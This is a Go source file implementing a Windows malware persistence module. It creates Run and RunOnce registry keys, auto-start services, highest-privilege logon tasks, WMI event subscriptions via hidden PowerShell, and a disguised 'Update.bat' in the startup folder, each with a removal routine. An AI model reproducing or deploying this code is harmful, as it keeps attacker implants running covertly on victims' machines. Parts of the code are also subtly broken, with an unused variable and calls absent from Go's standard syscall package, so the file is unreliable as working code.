// +build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"unsafe"
)

// PersistenceWindows provides persistence mechanisms for Windows
type PersistenceWindows struct{}

func NewPersistence() *PersistenceWindows {
	return &PersistenceWindows{}
}

// RegistryRun adds a Run key for persistence
func (p *PersistenceWindows) RegistryRun(keyName, exePath string) error {
	keyPath, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)

	var hKey syscall.Handle
	err := syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, keyPath, 0, syscall.KEY_WRITE, &hKey)
	if err != nil {
		return err
	}
	defer syscall.RegCloseKey(hKey)

	valueName, _ := syscall.UTF16PtrFromString(keyName)
	valueData, _ := syscall.UTF16PtrFromString(exePath)

	data := (*byte)(unsafe.Pointer(valueData))
	dataLen := uint32((len(exePath) + 1) * 2)

	return syscall.RegSetValueEx(hKey, valueName, 0, syscall.REG_SZ, data, dataLen)
}

// RegistryRunOnce adds a RunOnce key (executes once then removes)
func (p *PersistenceWindows) RegistryRunOnce(keyName, exePath string) error {
	keyPath, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\RunOnce`)

	var hKey syscall.Handle
	err := syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, keyPath, 0, syscall.KEY_WRITE, &hKey)
	if err != nil {
		return err
	}
	defer syscall.RegCloseKey(hKey)

	valueName, _ := syscall.UTF16PtrFromString(keyName)
	valueData, _ := syscall.UTF16PtrFromString(exePath)

	data := (*byte)(unsafe.Pointer(valueData))
	dataLen := uint32((len(exePath) + 1) * 2)

	return syscall.RegSetValueEx(hKey, valueName, 0, syscall.REG_SZ, data, dataLen)
}

// RemoveRegistryRun removes a Run key
func (p *PersistenceWindows) RemoveRegistryRun(keyName string) error {
	keyPath, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)

	var hKey syscall.Handle
	err := syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, keyPath, 0, syscall.KEY_WRITE, &hKey)
	if err != nil {
		return err
	}
	defer syscall.RegCloseKey(hKey)

	valueName, _ := syscall.UTF16PtrFromString(keyName)
	return syscall.RegDeleteValue(hKey, valueName)
}

// CreateService creates a Windows service for persistence
func (p *PersistenceWindows) CreateService(serviceName, displayName, exePath string) error {
	manager, err := syscall.OpenSCManager(nil, nil, syscall.SC_MANAGER_CREATE_SERVICE)
	if err != nil {
		return err
	}
	defer syscall.CloseServiceHandle(manager)

	servicePath, _ := syscall.UTF16PtrFromString(exePath)
	serviceNamePtr, _ := syscall.UTF16PtrFromString(serviceName)
	displayNamePtr, _ := syscall.UTF16PtrFromString(displayName)

	service, err := syscall.CreateService(
		manager,
		serviceNamePtr,
		displayNamePtr,
		syscall.SERVICE_ALL_ACCESS,
		syscall.SERVICE_WIN32_OWN_PROCESS,
		syscall.SERVICE_AUTO_START,
		syscall.SERVICE_ERROR_NORMAL,
		servicePath,
		nil, nil, nil, nil, nil,
	)
	if err != nil {
		return err
	}
	defer syscall.CloseServiceHandle(service)

	return nil
}

// DeleteService removes a Windows service
func (p *PersistenceWindows) DeleteService(serviceName string) error {
	manager, err := syscall.OpenSCManager(nil, nil, syscall.SC_MANAGER_CONNECT)
	if err != nil {
		return err
	}
	defer syscall.CloseServiceHandle(manager)

	serviceNamePtr, _ := syscall.UTF16PtrFromString(serviceName)
	service, err := syscall.OpenService(manager, serviceNamePtr, syscall.DELETE)
	if err != nil {
		return err
	}
	defer syscall.CloseServiceHandle(service)

	return syscall.DeleteService(service)
}

// StartService starts a Windows service
func (p *PersistenceWindows) StartService(serviceName string) error {
	manager, err := syscall.OpenSCManager(nil, nil, syscall.SC_MANAGER_CONNECT)
	if err != nil {
		return err
	}
	defer syscall.CloseServiceHandle(manager)

	serviceNamePtr, _ := syscall.UTF16PtrFromString(serviceName)
	service, err := syscall.OpenService(manager, serviceNamePtr, syscall.SERVICE_START)
	if err != nil {
		return err
	}
	defer syscall.CloseServiceHandle(service)

	return syscall.StartService(service, 0, nil)
}

// CreateScheduledTask creates a scheduled task for persistence
func (p *PersistenceWindows) CreateScheduledTask(taskName, exePath string) error {
	// Use schtasks command
	cmd := fmt.Sprintf(`schtasks /create /tn "%s" /tr "%s" /sc onlogon /rl highest /f`, taskName, exePath)
	return p.executeCommand(cmd)
}

// DeleteScheduledTask removes a scheduled task
func (p *PersistenceWindows) DeleteScheduledTask(taskName string) error {
	cmd := fmt.Sprintf(`schtasks /delete /tn "%s" /f`, taskName)
	return p.executeCommand(cmd)
}

// CreateWMISubscription creates a WMI event subscription for persistence
func (p *PersistenceWindows) CreateWMISubscription(name, exePath string) error {
	// Create event filter
	filterQuery := fmt.Sprintf(`
		$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
			Name = '%s_Filter';
			EventNameSpace = 'root\cimv2';
			QueryLanguage = 'WQL';
			Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240"
		}
	`, name)

	// Create event consumer
	consumerQuery := fmt.Sprintf(`
		$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
			Name = '%s_Consumer';
			CommandLineTemplate = '%s'
		}
	`, name, exePath)

	// Create binding
	bindingQuery := fmt.Sprintf(`
		Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
			Filter = $Filter;
			Consumer = $Consumer
		}
	`, name)

	// Execute via PowerShell
	fullQuery := filterQuery + consumerQuery + bindingQuery
	cmd := fmt.Sprintf(`powershell -WindowStyle Hidden -Command "%s"`, fullQuery)
	return p.executeCommand(cmd)
}

// DeleteWMISubscription removes a WMI event subscription
func (p *PersistenceWindows) DeleteWMISubscription(name string) error {
	queries := []string{
		fmt.Sprintf(`Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq '%s_Filter'} | Remove-WmiObject`, name),
		fmt.Sprintf(`Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq '%s_Consumer'} | Remove-WmiObject`, name),
		fmt.Sprintf(`Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter.Name -eq '%s_Filter'} | Remove-WmiObject`, name),
	}

	for _, q := range queries {
		cmd := fmt.Sprintf(`powershell -WindowStyle Hidden -Command "%s"`, q)
		p.executeCommand(cmd)
	}

	return nil
}

// StartupFolder adds a shortcut to the startup folder
func (p *PersistenceWindows) StartupFolder(exePath string) error {
	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	// Create a .lnk file (simplified - would need COM for proper shortcut)
	shortcutPath := filepath.Join(startupPath, "Update.lnk")

	// For simplicity, we'll create a batch file instead
	batchPath := filepath.Join(startupPath, "Update.bat")
	batchContent := fmt.Sprintf(`@echo off
start "" "%s"
`, exePath)

	return os.WriteFile(batchPath, []byte(batchContent), 0644)
}

// RemoveStartupFolder removes the startup shortcut
func (p *PersistenceWindows) RemoveStartupFolder() error {
	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	// Remove both .lnk and .bat
	os.Remove(filepath.Join(startupPath, "Update.lnk"))
	os.Remove(filepath.Join(startupPath, "Update.bat"))

	return nil
}

func (p *PersistenceWindows) executeCommand(cmd string) error {
	// Execute command via cmd.exe
	c := exec.Command("cmd.exe", "/c", cmd)
	c.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	return c.Run()
}
